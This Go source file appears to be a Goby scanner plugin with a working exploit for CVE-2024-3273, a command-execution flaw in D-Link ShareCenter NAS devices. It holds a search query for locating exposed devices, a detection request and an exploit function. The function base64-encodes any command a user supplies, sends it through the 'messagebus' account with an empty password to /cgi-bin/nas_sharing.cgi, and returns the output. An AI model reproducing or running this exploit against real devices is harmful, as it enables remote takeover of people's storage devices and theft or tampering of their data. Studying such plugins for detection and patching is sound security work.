package exploits

import (
	"encoding/base64"
	"fmt"
	"log"
	"regexp"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "D-Link NAS /cgi-bin/nas_sharing.cgi Command Execution Vulnerability(CVE-2024-3273)",
    "Description": "<p>Since the /cgi-bin/nas_sharing.cgi interface of the D-Link ShareCenter product can bypass permission control and pass the base64-encoded malicious code, system commands can be arbitrarily executed on the server. Attackers exploiting this vulnerability may cause serious harm such as sensitive data leakage, system file tampering, malicious code execution, information leakage, and system privilege escalation in the system.</p>",
    "Product": "D_Link-DNS-ShareCenter",
    "Homepage": "http://www.dlink.com.cn/",
    "DisclosureDate": "2024-04-07",
    "PostTime": "2024-04-10",
    "Author": "兰公子",
    "FofaQuery": "body=\"/cgi-bin/login_mgr.cgi\" && body=\"ShareCenter\" && body!=\"Server: couchdb\"",
    "GobyQuery": "body=\"/cgi-bin/login_mgr.cgi\" && body=\"ShareCenter\" && body!=\"Server: couchdb\"",
    "Level": "3",
    "Impact": "<p>Since the /cgi-bin/nas_sharing.cgi interface of the D-Link ShareCenter product can bypass permission control and pass the base64-encoded malicious code, system commands can be arbitrarily executed on the server. Attackers exploiting this vulnerability may cause serious harm such as sensitive data leakage, system file tampering, malicious code execution, information leakage, and system privilege escalation in the system.</p>",
    "Recommendation": "<p>The vulnerability has not been officially fixed, please contact the manufacturer to fix the vulnerability:<a href=\"https://www.dlink.com/\">https://www.dlink.com/</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "command",
            "type": "input",
            "value": "pwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system=aWQ=",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uid",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "vulurl|lastbody|variable|{{{fixedhostinfo}}}/cgi-bin/nas_sharing.cgi"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2024-3273"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.4",
    "Translation": {
        "CN": {
            "Name": "D-Link NAS /cgi-bin/nas_sharing.cgi 命令执行漏洞（CVE-2024-3273）",
            "Product": "D_Link-DNS-ShareCenter",
            "Description": "<p>由于 D-Link ShareCenter 产品的 /cgi-bin/nas_sharing.cgi 接口可以绕过权限控制并通过传递 base64 编码后的恶意代码可以在服务器中任意执行系统命令。攻击者利用此漏洞可能会导致系统中的敏感数据泄露、系统文件篡改、恶意代码执行、信息泄露以及系统权限提升等严重危害，为确保系统和数据安全，需要及时修复漏洞、加强系统安全防护措施。</p>",
            "Recommendation": "<p>官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.dlink.com/\" target=\"_blank\">https://www.dlink.com/</a><br></p>",
            "Impact": "<p>由于 D-Link ShareCenter 产品的 /cgi-bin/nas_sharing.cgi 接口可以绕过权限控制并通过传递 base64 编码后的恶意代码可以在服务器中任意执行系统命令。攻击者利用此漏洞可能会导致系统中的敏感数据泄露、系统文件篡改、恶意代码执行、信息泄露以及系统权限提升等严重危害，为确保系统和数据安全，需要及时修复漏洞、加强系统安全防护措施。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "D-Link NAS /cgi-bin/nas_sharing.cgi Command Execution Vulnerability(CVE-2024-3273)",
            "Product": "D_Link-DNS-ShareCenter",
            "Description": "<p>Since the /cgi-bin/nas_sharing.cgi interface of the D-Link ShareCenter product can bypass permission control and pass the base64-encoded malicious code, system commands can be arbitrarily executed on the server. Attackers exploiting this vulnerability may cause serious harm such as sensitive data leakage, system file tampering, malicious code execution, information leakage, and system privilege escalation in the system.<br></p>",
            "Recommendation": "<p>The vulnerability has not been officially fixed, please contact the manufacturer to fix the vulnerability:<a href=\"https://www.dlink.com/\" target=\"_blank\">https://www.dlink.com/</a><br></p>",
            "Impact": "<p>Since the /cgi-bin/nas_sharing.cgi interface of the D-Link ShareCenter product can bypass permission control and pass the base64-encoded malicious code, system commands can be arbitrarily executed on the server. Attackers exploiting this vulnerability may cause serious harm such as sensitive data leakage, system file tampering, malicious code execution, information leakage, and system privilege escalation in the system.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10941"
}`

	// 正则匹配(输入：表达式 , 内容)
	makeRegularasQWCcc := func(RegularContent string, RegularUrl string) (string, error) {
		reRequestasQWCcc := regexp.MustCompile(RegularUrl)
		if !reRequestasQWCcc.MatchString(RegularContent) {
			return "", fmt.Errorf("can't match value")
		}
		getname := reRequestasQWCcc.FindStringSubmatch(RegularContent)
		return getname[1], nil
	}

	//GET请求构造(请求url)
	sendPayloadFlagGetQWCcc := func(hostInfo *httpclient.FixUrl, urlOfGet string, getHeaderMap map[string]string) (*httpclient.HttpResponse, error) {
		log.Println(urlOfGet)
		getRequestConfigQWCcc := httpclient.NewGetRequestConfig(urlOfGet)
		getRequestConfigQWCcc.VerifyTls = false
		getRequestConfigQWCcc.FollowRedirect = false
		for postHeaderKey, postHeaderValue := range getHeaderMap {
			getRequestConfigQWCcc.Header.Store(postHeaderKey, postHeaderValue)
		}
		return httpclient.DoHttpRequest(hostInfo, getRequestConfigQWCcc)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			command := goutils.B2S(ss.Params["command"])
			commandBaes64 := base64.StdEncoding.EncodeToString([]byte(command))

			getSecResultOfMap := map[string]string{}
			cfg, err := sendPayloadFlagGetQWCcc(expResult.HostInfo, "/cgi-bin/nas_sharing.cgi?user=messagebus&passwd=&cmd=15&system="+commandBaes64, getSecResultOfMap)
			if err != nil {
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			pathOfThePostasQWCcc, err := makeRegularasQWCcc(cfg.Utf8Html, `([\s\S]*?)<\?xml`)
			if err != nil {
				expResult.Output = "漏洞利用失败"
				return expResult
			}
			expResult.Success = true
			expResult.Output += "命令已成功执行,结果为：\n" + pathOfThePostasQWCcc

			return expResult
		},
	))
}
